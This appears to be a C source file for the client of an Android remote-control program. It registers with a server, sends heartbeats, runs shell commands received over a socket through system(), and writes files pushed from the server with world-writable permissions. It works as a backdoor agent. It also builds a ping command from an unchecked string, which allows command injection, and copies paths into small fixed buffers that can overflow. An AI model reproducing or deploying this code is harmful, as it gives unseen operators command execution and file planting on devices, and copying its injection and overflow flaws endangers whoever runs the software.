#include "toolsfun.h"
#include "contain.h"
#include <unistd.h>
#include "config.h"
#include "socket_control.h"
#include "project_head.h"
#include "pthreadxsx.h"
#include <fcntl.h>

#define _GNU_SOURCE

extern int extid;

int linkbash()
{
	int red = mkdir("/bin",777);
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	red = symlink("/system/bin/sh","/bin/sh");
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	return true;
}


int report(int ans,int sock)
{
	U_MSG k;
	k.type = T_ANSWR;
	k.answer_m.id = extid;
	k.answer_m.torf = ans;

	int n = write(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
	{
		perror("write err");
		return false;
	}
}


int waiting(int sock)
{
	U_MSG k;
	while(1)
	{
		int n = recv(sock,&k,sizeof(U_MSG),0);

		if(n!=sizeof(U_MSG))
		{
			DEBUGW;
			perror("read err");DEBUGW;
			return false;
		}
		switch(k.type)
		{
			case T_SHELL:
			{
				char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
				memset(shellbuf,0,k.shell_m.commandlen+1);
				n = read(sock,shellbuf,k.shell_m.commandlen);
				if(n!=k.shell_m.commandlen)
				{
					perror("read err");DEBUGW;
					free(shellbuf);
					return false;
				}
				printf("%s\n", shellbuf);
				system(shellbuf);
				free(shellbuf);
				int ans = report(1,sock);
				if(ans == false)
					return false;
				break;
			}
			case T_TFILE:
			{
				char *tfilebuf = (char*)malloc(k.tfile_m.path+1);
				memset(tfilebuf,0,k.tfile_m.path+1);
				n = read(sock,tfilebuf,k.tfile_m.path);
				if(n!=k.tfile_m.path)
				{
					perror("read err");DEBUGW;
					free(tfilebuf);
					return false;
				}
				printf("%s\n", tfilebuf);
				int fd = r_creatfile(tfilebuf);
				if(fd == -1)
				{
					int ans = report(0,sock);
					if(ans == false)
						return false;
					free(tfilebuf);
					continue;
				}
				DEBUGW;
				int ans = report(1,sock);
				if(ans == false)
					return false;
				char buffile[4096] = {0};
				int readsize, totalsize = 0;
				do
				{
					DEBUGW;
					readsize = read(sock, buffile, 4096);
					totalsize+=readsize;
					DEBUGI(readsize);
					if(readsize <= 0)
						break;
					printf("%s\n", buffile);
					write(fd, buffile, readsize);
					if(totalsize == k.tfile_m.size)
						break;
					DEBUGW;
				}while(1);
/*				int pipefd[2];
				int ret = pipe(pipefd);
				DEBUGW;
				ret = splice(sock,NULL,pipefd[1],NULL,k.tfile_m.size, 0);
				ret = splice(pipefd[0], NULL, fd, NULL, k.tfile_m.size, 0);
				if(ret == -1)
				{
					perror("read err");
				}
				DEBUGI(ret);DEBUGW;
				close(pipefd[1]);
				close(pipefd[0]);*/
				close(fd);
				DEBUGW;

			}
			default:
				break;
		}
	}	
}



void* ping_pthread(void * argument)
{
	char* shell =(char*)argument;
	system(shell);
}


int dnsbyping(char* ip)
{
	char *filename = "tmp.txt";
	char newip[30] = {0};
	char ping[40] = {0};
	sprintf(ping,"ping %s > %s",ip,filename);
	pthread_t pid = pthread_run(ping_pthread,ping);
	sleep(2);
	pthread_cancel(pid);
	pthread_join(pid,NULL);
	int filefd = open(filename,O_RDWR);
	if(filefd == -1)
	{
		return false;
	}
	char buf[100] = {0};
	char *pr = buf;
	int res = 0;
	while( 1 )
	{
		res = read(filefd,pr,1);
		if(res != 1)
			return false;
		if(*pr != ')')
			pr++;
		else
			break;
	}
	close(filefd);
	unlink(filename);
	*pr = 0;
	pr = strchr(buf,'(');
	if(pr == NULL)
		return false;
	pr++;
	strcpy(ip,pr);
	return true;
}

int r_creatfile(char * path)
{
	int i=  0;
	for (; i < 2; ++i)
	{
		int red = open(path,O_RDWR|O_CREAT|O_TRUNC,0777);
		if(red == -1)
		{
			if( errno != ENOENT)
				return -1;
			char * pr = strrchr(path,'/');
			if(pr == path)
				return 0;
			char newpath[50] = {0};
			memcpy(newpath, path, pr-path);
			printf("%s\n", newpath);
			r_mkdir(newpath);
		}
		else
			return red;
	}
	return 0;	
}


int r_mkdir(char * path)
{
	int i=  0;
	for (; i < 2; ++i)
	{
		int red = mkdir(path,0777);
		if(red == -1)
		{
			if( errno != ENOENT)
				return -1;
			char * pr = strrchr(path,'/');
			if(pr == path)
				return 0;
			char newpath[50] = {0};
			memcpy(newpath, path, pr-path);
			printf("%s\n", newpath);
			r_mkdir(newpath);
		}
		else
			return 0;
	}
	return 0;
}




int rgist(int sock)
{
	U_MSG k;
	k.regist_m.type = T_REGST;
	k.regist_m.id = 0;
	int n = write(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	n = read(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	extid = k.regist_m.id;
	return k.regist_m.id;
}


int beatheart(int sock)
{
	U_MSG k;
	k.regist_m.type = T_HEART;
	k.regist_m.id = extid;
	int n = write(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
}
